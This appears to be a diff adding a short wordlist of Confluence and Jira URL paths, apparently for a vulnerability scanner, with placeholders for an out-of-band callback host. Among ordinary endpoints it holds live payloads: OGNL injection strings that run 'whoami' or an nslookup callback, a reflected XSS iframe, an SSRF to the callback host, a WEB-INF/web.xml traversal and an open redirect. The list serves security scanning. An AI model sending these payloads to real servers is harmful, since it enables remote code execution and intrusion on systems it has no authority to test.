@@ -1,0 +1,17 @@
+/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
+/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{{interactsh-url}}%22%29%7D/
+/setup/setupcluster-start.action
+/servicedesk/customer/user/login
+/servicedesk/customer/portal/10/user/login
+/plugins/servlet/oauth/view-consumer-info
+/confluence/plugins/servlet/oauth/view-consumer-info
+/dologin.action
+
+/pages
+/confluence
+/wiki
+/spaces/viewdefaultdecorator.action?decoratorName
+/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm
+/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
+/s/{{randstr}}/_/;/WEB-INF/web.xml
+/ThisCanBeAnything?os_destination=%2F%2Foast.pro
